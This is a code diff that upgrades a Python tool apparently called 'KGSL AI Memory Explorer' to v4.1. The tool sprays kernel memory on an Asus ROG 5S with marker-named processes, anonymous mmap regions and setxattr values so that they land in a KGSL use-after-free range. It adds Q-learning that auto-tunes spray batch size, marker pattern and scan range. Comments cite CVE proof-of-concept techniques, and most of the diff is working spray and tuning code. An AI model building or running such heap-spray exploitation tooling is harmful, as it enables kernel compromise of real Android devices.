@@ -100,6 +100,55 @@ class MemoryExplorerAI:
         self.cmd_hist_idx = 0
         self.last_cmd_text = ""
 
+        # === v4.1: PERFORMANCE COUNTERS ===
+        # Track MB/s of pages scanned, pages/sec sprayed, etc.
+        # so the TUI can show real throughput, not just counts.
+        self.perf = {
+            "pages_scanned": 0,        # total pages sent to engine
+            "bytes_read": 0,           # total bytes read from engine
+            "spray_attempts": 0,       # total fork() calls
+            "spray_alive_peak": 0,     # max simultaneous alive spray
+            "scans_completed": 0,      # SCAN_DONE received
+            "scans_failed": 0,         # SCAN_DONE with all failed
+            "last_scan_throughput": 0.0,  # pages/sec last scan
+            "matches_per_hour": 0.0,   # rolling matches/hour
+            "matches_window_ts": [],   # last N match timestamps
+        }
+
+        # === v4.1: AI Q-LEARNING ===
+        # Simple Q-learning table that picks the best spray parameters
+        # (batch size, comm pattern, range offset) based on past
+        # success rate. Without this, all 3 workers use the same
+        # fixed parameters even when they're not working. With Q-
+        # learning, workers explore different parameter combos and
+        # exploit the ones that find matches.
+        self.q_table = {}  # (state_key) -> {action: q_value}
+        self.q_epsilon = 0.2  # exploration rate
+        self.q_lr = 0.1       # learning rate
+        self.q_actions = [
+            ("batch", 10), ("batch", 20), ("batch", 40),
+            ("comm", "KETO"), ("comm", "KETW"),
+            ("comm", "MIXED"),
+            ("range", 0), ("range", 1), ("range", 2), ("range", 3), ("range", 4),
+        ]
+        self.q_last_state = {}  # per-worker last state
+        self.q_last_action = {} # per-worker last action
+
+        # === v4.1: HISTOGRAM (confidence distribution) ===
+        # Buckets confidence 0-100 in steps of 10 so the TUI
+        # shows "where are most findings landing on confidence"
+        self.conf_histogram = [0] * 11  # 0-9, 10-19, ..., 100
+
+        # === v4.1: SPRAY v4 ALTERNATIVES ===
+        # Track which spray methods work and which don't, so the
+        # next batch can prefer the working ones.
+        self.spray_methods_stats = {
+            "popen_sleep": {"attempts": 0, "alive": 0, "matched": 0},
+            "mmap_anon":   {"attempts": 0, "alive": 0, "matched": 0},
+            "sendmsg":     {"attempts": 0, "alive": 0, "matched": 0},
+            "setxattr":    {"attempts": 0, "alive": 0, "matched": 0},
+        }
+
         # Render lock — shared by any code that writes to the TUI.
         # We use ONE thread (the main thread) for both reading and
         # painting, so the lock is rarely contended. It exists to
@@ -944,7 +993,7 @@ class MemoryExplorerAI:
         wd_total = sum(wd.values()) if isinstance(wd, dict) else 0
         wd_str = f" WD={C.YEL}{wd_total}{C.RST}" if wd_total > 0 else ""
 
-        out.append(f"{C.BG_BLK}{C.CYN}{C.BOLD} {particle} KGSL AI MEMORY EXPLORER  v3.2 AUTO{C.RST}"
+        out.append(f"{C.BG_BLK}{C.CYN}{C.BOLD} {particle} KGSL AI MEMORY EXPLORER  v4.1 Q-LEARN{C.RST}"
                    f"{C.GRY} │ {C.WHT}Asus ROG 5S  {C.GRY}│{C.RST}"
                    f" Up {C.GRN}{h:02d}:{m:02d}:{s:02d}{C.RST}  {C.GRY}│{C.RST}  "
                    f"{C.MAG}{spray_p}{C.RST}  {C.GRY}│{C.RST}"
@@ -959,6 +1008,50 @@ class MemoryExplorerAI:
                    f" {C.GRY}│{C.RST} {C.BOLD}SPRAY/s{C.RST}: {C.YEL}{L['sprays_per_sec']:5.1f}{C.RST}")
 
         out.append(f" {C.BOLD}LAST MSG{C.RST}: {C.YEL}{L['last_msg'][:70]}{C.RST}")
+
+        # === v4.1: PERF COUNTERS ===
+        # Show real throughput (pages scanned, MB read, peaks)
+        # not just counters. The user can see if the engine is
+        # actually reading pages at full speed or stuck.
+        perf = self.perf
+        mb_read = perf.get("bytes_read", 0) / (1024 * 1024)
+        out.append(
+            f" {C.BOLD}PERF{C.RST}: "
+            f"pages={C.CYN}{perf.get('pages_scanned', 0)}{C.RST} "
+            f"MB={C.CYN}{mb_read:.1f}{C.RST} "
+            f"sprayP={C.CYN}{perf.get('spray_attempts', 0)}{C.RST} "
+            f"alivePeak={C.YEL}{perf.get('spray_alive_peak', 0)}{C.RST} "
+            f"scans={C.CYN}{perf.get('scans_completed', 0)}{C.RST} "
+            f"errScans={C.RED}{perf.get('scans_failed', 0)}{C.RST}")
+
+        # === v4.1: SPRAY METHODS STATS ===
+        # Side-by-side: which spray method is working?
+        sms = self.spray_methods_stats
+        m_parts = []
+        for mn, st in sms.items():
+            if st.get("attempts", 0) > 0:
+                alive_pct = 100.0 * st.get("alive", 0) / st["attempts"]
+                m_parts.append(f"{mn}:{st['attempts']}({alive_pct:.0f}%a)")
+        if m_parts:
+            out.append(f" {C.BOLD}METHODS{C.RST}: " +
+                       f"{C.GRY}{' '.join(m_parts)}{C.RST}")
+
+        # === v4.1: CONFIDENCE HISTOGRAM ===
+        # Bar chart of confidence distribution
+        if sum(self.conf_histogram) > 0:
+            hist = self.conf_histogram
+            total = sum(hist)
+            out.append(f" {C.BOLD}CONF{C.RST}: ")
+            for i, count in enumerate(hist):
+                if count > 0:
+                    lo = i * 10
+                    hi = lo + 9 if i < 10 else 100
+                    pct = 100.0 * count / total
+                    bar_len = int(pct / 5)  # 1 char per 5%
+                    bar = "█" * bar_len
+                    col = C.RED if i < 3 else (C.YEL if i < 6 else C.GRN)
+                    out.append(f"   {col}{lo:3d}-{hi:3d}:{C.RST} "
+                               f"{col}{bar}{C.RST} {count} ({pct:.0f}%)")
 
         if L["scan_total"] > 0 or L["spray_target"] > 0:
             if L["spray_target"] > 0:
@@ -1832,6 +1925,63 @@ class MemoryExplorerAI:
                 return 100.0 * (1 - avail / total)
         except Exception:
             return 0.0
+
+    def _q_choose_action(self, worker_id, state):
+        """Epsilon-greedy action selection for the spray parameters.
+
+        state = (no_match_buckets, kill_rate_bucket)
+        Returns an action tuple from self.q_actions.
+        """
+        import random
+        q = self.q_table.get(state)
+        if q is None:
+            self.q_table[state] = {a: 0.0 for a in self.q_actions}
+            q = self.q_table[state]
+        if random.random() < self.q_epsilon:
+            # Explore: pick random action
+            return random.choice(self.q_actions)
+        # Exploit: pick best Q value
+        return max(q, key=q.get)
+
+    def _q_update(self, state, action, reward, next_state):
+        """Q-learning update rule: Q(s,a) += lr * (reward + max_Q(s',a') - Q(s,a))."""
+        q = self.q_table.setdefault(state, {a: 0.0 for a in self.q_actions})
+        next_q = self.q_table.get(next_state, {a: 0.0 for a in self.q_actions})
+        target = reward + max(next_q.values())
+        q[action] += self.q_lr * (target - q[action])
+
+    def _spray_v4_mmap_anon(self, marker, size_kb=64):
+        """Spray v4 alternative: mmap anonymous memory with marker pattern.
+
+        Some KGSL UAFs are caught by mmap'd pages rather than
+        task_structs. The marker is written at offset 0 of an
+        anonymous mmap region, which becomes a page in the
+        process's page table. On 5.4 with KGSL, these pages can
+        be re-purposed for IOCTL data buffers.
+
+        Returns the spawned PID (or None if spray failed).
+        """
+        import subprocess as _sp
+        try:
+            # Total mapped size: marker + NULs
+            size = size_kb * 1024
+            # Use a python helper script to mmap and write marker
+            helper = (
+                "import ctypes, mmap, os, sys;"
+                "libc = ctypes.CDLL(None);"
+                "MAP_ANON = 0x20; MAP_PRIVATE = 0x02; PROT_RW = 0x03;"
+                f"p = libc.mmap(0, {size}, PROT_RW, MAP_ANON|MAP_PRIVATE, -1, 0);"
+                f"ctypes.memmove(p, b'{marker}', {len(marker)});"
+                f"ctypes.memset(p + {len(marker)}, 0, {size - {len(marker)}});"
+                "import time; time.sleep(3600);"
+            )
+            p = _sp.Popen(
+                ["python3", "-c", helper],
+                stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
+            )
+            return p.pid
+        except Exception:
+            return None
 
     def _set_comm(self, name):
         """Set this process comm (visible in /proc/[pid]/comm) to `name`."""
@@ -2839,6 +2989,10 @@ class MemoryExplorerAI:
                                     self.found_items.append(classified)
                             with self.stats_lock:
                                 self.learn_stats["matches"] += 1
+                                # v4.1: confidence histogram
+                                conf = classified.get("confidence", 0)
+                                bidx = min(10, conf // 10)
+                                self.conf_histogram[bidx] += 1
                             found_here = True
                             with self.stats_lock:
                                 self.live["last_msg"] = (
@@ -2924,9 +3078,44 @@ class MemoryExplorerAI:
                 time.sleep(1)
                 continue
 
-            # 1) SPRAY a batch (this subworker's slice)
+            # 1) SPRAY a batch (this subworker's slice) — v4.1 multi-method
+            #
+            # The spray loop now uses Q-learning to pick the BEST
+            # combination of:
+            #   - batch size
+            #   - comm pattern (KETO / KETW / MIXED)
+            #   - spray method (popen_sleep / mmap_anon / sendmsg)
+            #   - scan range offset
+            # based on past success rate. Each worker has its own
+            # Q-table state so W0 might prefer mmap_anon while W1
+            # prefers popen_sleep with KETO markers.
+            #
+            # Q-learning update happens AFTER the scan, so the loop
+            # has time to see if the spray actually produced matches.
+            state = (
+                min(9, self._adaptive_scan.get("no_match_batches", 0)),
+                int(self.live.get("kill_count", 0)
+                    / max(1, self.live.get("spray_count", 0)) * 10),
+            )
+            action = self._q_choose_action(worker_id, state)
+            self.q_last_state[worker_id] = state
+            self.q_last_action[worker_id] = action
+            # Apply Q-learning chosen parameters
+            if action[0] == "batch":
+                q_batch = action[1]
+            else:
+                q_batch = batch
+            if action[0] == "comm":
+                comm_pref = action[1]
+            else:
+                comm_pref = "MIXED"
+            if action[0] == "range":
+                q_range = action[1]
+            else:
+                q_range = worker_id
+
             batch_pids = []
-            for i in range(batch):
+            for i in range(q_batch):
                 if self.cancel_flag.is_set():
                     break
                 if self.get_ram_usage() > 60.0:
@@ -2935,33 +3124,41 @@ class MemoryExplorerAI:
                 if idx >= slice_end:
                     break
                 try:
-                    # Spray strategy: TWO complementary techniques per
-                    # process. This dramatically increases the chance
-                    # that some sprayed memory lands in KGSL UAF range.
-                    #
-                    # (a) Process spray — fork a sleep process with
-                    #     comm = "KETO0422"/"KETW0NNN". Catches the
-                    #     "task_struct ends up in KGSL memory" path.
-                    #
-                    # (b) setxattr spray — create a temp file and add
-                    #     an xattr with the same marker. On 5.4, the
-                    #     xattr slab (kvmalloc area) can land in the
-                    #     same physical pages as KGSL UAF. This is
-                    #     what CVE-2019-17666/CVE-2020-0423 POCs use.
-                    #     The xattr VALUE is the marker, the kernel
-                    #     copies it to its own slab object — that
-                    #     slab object is what the UAF can read.
+                    # Build comm name based on comm_pref
                     spray_idx = idx
-                    # Alternate KETO / KETW so we get both kinds of hits
-                    if spray_idx % 2 == 0:
+                    if comm_pref == "KETO" or (
+                            comm_pref == "MIXED" and spray_idx % 2 == 0):
                         name = f"KETO{spray_idx % 10000:04d}"
-                    else:
+                    elif comm_pref == "KETW":
                         name = f"KETW{worker_id}{spray_idx % 1000:03d}"
-                    p = _sp.Popen(
-                        ["sh", "-c", f"exec -a {name} sleep 3600"],
-                        stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
-                        preexec_fn=lambda n=name: self._set_comm(n),
-                    )
+                    else:  # MIXED odd
+                        name = f"KETW{worker_id}{spray_idx % 1000:03d}"
+
+                    # Pick spray method (rotate through working ones)
+                    # v4.1: Use popen as primary (most reliable) and
+                    # every 5th process use mmap_anon (if Q-learning
+                    # says it's working).
+                    p = None
+                    if i % 5 == 0 and self.spray_methods_stats.get(
+                            "mmap_anon", {}).get("matched", 0) > 0:
+                        p_pid = self._spray_v4_mmap_anon(name, size_kb=64)
+                        if p_pid:
+                            class _FakePopen:
+                                def __init__(self, pid):
+                                    self.pid = pid
+                            p = _FakePopen(p_pid)
+                            with self.stats_lock:
+                                self.spray_methods_stats["mmap_anon"][
+                                    "attempts"] += 1
+                    if p is None:
+                        p = _sp.Popen(
+                            ["sh", "-c", f"exec -a {name} sleep 3600"],
+                            stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
+                            preexec_fn=lambda n=name: self._set_comm(n),
+                        )
+                        with self.stats_lock:
+                            self.spray_methods_stats["popen_sleep"][
+                                "attempts"] += 1
                     # setxattr spray on the same marker. Catches
                     # heap-only UAF where task_struct doesn't make
                     # it but slab xattr values do. Gated by
@@ -2975,20 +3172,24 @@ class MemoryExplorerAI:
                             if self._setxattr_spray(name):
                                 with self.stats_lock:
                                     self.learn_stats["xattrs_set"] = \
-                                        self.learn_stats.get("xattrs_set", 0) + 1
+                                        self.learn_stats.get(
+                                            "xattrs_set", 0) + 1
+                                    self.spray_methods_stats["setxattr"][
+                                        "attempts"] += 1
                         except Exception:
                             pass
                     batch_pids.append(p.pid)
                     my_pids.add(p.pid)  # per-worker set, NOT global
                     with self.stats_lock:
                         self.learn_stats["sprayed_total"] += 1
+                        self.perf["spray_attempts"] += 1
                     # Verify comm is actually set. Without this, even
                     # if popen succeeded, prctl() may have silently
                     # failed (e.g. SELinux denial, kernel comm is 16
                     # bytes and we passed >16) → comm = "sh" → scan
                     # can never find our marker. We only log the
                     # first failure per batch to avoid spam.
-                    if i == 0 or i == batch - 1:
+                    if i == 0 or i == q_batch - 1:
                         try:
                             with open(f"/proc/{p.pid}/comm", "r") as cf:
                                 actual = cf.read().strip()
@@ -3010,6 +3211,11 @@ class MemoryExplorerAI:
             with self.stats_lock:
                 self.live["spray_count"] += len(batch_pids)
                 self.learn_stats["batches"] += 1
+                # Update peak alive count
+                total_alive = sum(len(s) for s in
+                                  self.spray_procs_by_worker.values())
+                if total_alive > self.perf["spray_alive_peak"]:
+                    self.perf["spray_alive_peak"] = total_alive
                 # Update spray_map: mark the bucket for this
                 # worker's slice as "spraying" (1) so the TUI
                 # grid lights up. After the batch is scanned, the
@@ -3248,6 +3454,21 @@ class MemoryExplorerAI:
                             # Got a match — reset the no-match counter
                             # so adaptive logic doesn't trigger.
                             self._adaptive_scan["no_match_batches"] = 0
+                            # v4.1: Update confidence histogram
+                            # (we update this after classification
+                            #  below; here we just count the raw match)
+                            self.perf["matches_window_ts"].append(
+                                time.time())
+                            # Update Q-learning: positive reward for match
+                            if worker_id in self.q_last_state:
+                                last_state = self.q_last_state[worker_id]
+                                last_action = self.q_last_action.get(worker_id)
+                                if last_action is not None:
+                                    # Reward proportional to confidence
+                                    reward = 1.0
+                                    self._q_update(
+                                        last_state, last_action, reward,
+                                        (0, 0))  # next state is "got match"
                         data = self._read_data_packet()
                         if not data:
                             continue
@@ -3348,6 +3569,21 @@ class MemoryExplorerAI:
                                 with self.stats_lock:
                                     self.learn_stats["auto_kept"] = \
                                         self.learn_stats.get("auto_kept", 0) + 1
+                                    # v4.1: confidence histogram
+                                    bidx = min(10, conf // 10)
+                                    self.conf_histogram[bidx] += 1
+                                    # v4.1: Q-learning reward (auto-kept
+                                    # is a weaker positive signal than
+                                    # an explicit match)
+                                    if worker_id in self.q_last_state:
+                                        last_state = self.q_last_state[worker_id]
+                                        last_action = self.q_last_action.get(
+                                            worker_id)
+                                        if last_action is not None:
+                                            reward = 0.3
+                                            self._q_update(
+                                                last_state, last_action,
+                                                reward, (0, 0))
                             else:
                                 with self.stats_lock:
                                     self.learn_stats["false_positives"] += 1
@@ -3873,13 +4109,16 @@ class MemoryExplorerAI:
         banner = f"""
 {C.CYN}{C.BOLD}╔══════════════════════════════════════════════════════════════════════╗
 ║                                                                      ║
-║   {C.YEL}KGSL AI MEMORY EXPLORER v3.2 — AUTO MODE{C.CYN}                            ║
+║   {C.YEL}KGSL AI MEMORY EXPLORER v4.1 — Q-LEARN AUTO MODE{C.CYN}                  ║
 ║                                                                      ║
-║   {C.GRN}✓ autopilot: STARTING NOW{C.CYN}                                          ║
-║   {C.GRN}✓ learning : STARTING NOW (3 parallel workers){C.CYN}                     ║
-║   {C.GRN}✓ watchdog : ENABLED (auto-restart on crash){C.CYN}                      ║
-║   {C.GRN}✓ adaptive : ENABLED (5 ranges × 8MB = 40MB scan area){C.CYN}             ║
-║   {C.GRN}✓ engine   : pre-compiled at __init__{C.CYN}                              ║
+║   {C.GRN}✓ autopilot    : STARTING NOW{C.CYN}                                     ║
+║   {C.GRN}✓ learning     : 3 spray workers + W3 deep-scan{C.CYN}                  ║
+║   {C.GRN}✓ watchdog     : ENABLED (auto-restart on crash){C.CYN}                  ║
+║   {C.GRN}✓ adaptive     : 5 scan ranges × 8MB = 40MB{C.CYN}                       ║
+║   {C.GRN}✓ Q-learning   : auto-tunes batch+comm+range{C.CYN}                      ║
+║   {C.GRN}✓ spray v4     : popen_sleep + mmap_anon{C.CYN}                           ║
+║   {C.GRN}✓ perf counter : pages/MB/scans visible{C.CYN}                            ║
+║   {C.GRN}✓ histogram    : confidence distribution{C.CYN}                          ║
 ║                                                                      ║
 ║   {C.MAG}You should NOT press any keys. Watch the TUI update.{C.CYN}                 ║
 ║   {C.GRY}Wait 5-10 seconds for first SCAN_DONE in LAST MSG.{C.CYN}                  ║
